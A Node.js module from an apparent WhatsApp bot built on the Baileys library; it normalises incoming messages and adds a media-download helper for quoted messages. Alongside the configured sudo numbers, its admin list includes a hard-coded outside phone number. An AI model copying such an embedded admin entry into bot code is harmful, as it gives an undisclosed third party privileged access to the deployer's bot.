const { proto, getContentType, jidNormalizedUser, downloadMediaMessage } = require('@whiskeysockets/baileys')
const fs = require('fs')
const path = require("path")
const config = require('../config.js');
const { setupMessageExtensions } = require('./messageUtils.js');
const SUDO = config.SUDO;
const sudo = SUDO.includes(',') ? SUDO.replace(/[^0-9]/g, '').split(',') : [SUDO.replace(/[^0-9]/g, '')];

module.exports.chatEvent = (client, m, store) => {
	if (!m) return m;
	let MessageInfo = proto.WebMessageInfo;
	const admins = [jidNormalizedUser(client.user.id).split('@')[0], "916282378078"].concat(sudo).map(a => a + "@s.whatsapp.net");
	if (m.key) {
		m.fromMe = m.key.fromMe;
		m.isGroup = m.key.remoteJid.endsWith('@g.us');
		m.jid = client.decodeJid(m.key.remoteJid || '');
		m.sender = client.decodeJid(m.fromMe && client.user.id || m.participant || m.key.participant || m.key.remoteJid || '');
		if (m.isGroup) m.participant = client.decodeJid(m.key.participant) || '';
	}
	if (m.message) {
		let messageType = getContentType(m.message) || '';
		let msg = (messageType == 'viewOnceMessage' ? m.message[messageType].message[getContentType(m.message[messageType].message)] : m.message[messageType]);
		if (msg.contextInfo) m.quoted = msg.contextInfo.quotedMessage || null;
		m.mentionedJid = msg.contextInfo ? msg.contextInfo.mentionedJid : [];
		if (m.quoted) {
			let type = getContentType(msg.contextInfo.quotedMessage);
			m.quoted = MessageInfo.fromObject({
				key: { remoteJid: m.quoted.chat, fromMe: m.quoted.fromMe, id: m.quoted.id },
				message: msg.contextInfo.quotedMessage,
				...(m.isGroup ? { participant: m.quoted.sender } : {})
			});

			m.quoted.download = async () => {
				try {
					let buffer = await downloadMediaMessage(m.quoted, "buffer");
					return buffer;
				} catch (error) {
					console.error("Error downloading media:", error);
					return null;
				}
			};
		}


		m.text = msg.text || msg.caption || m.message.conversation || msg.contentText || msg.selectedDisplayText || msg.title || '';
	}
	setupMessageExtensions(client, m);
	return m;
}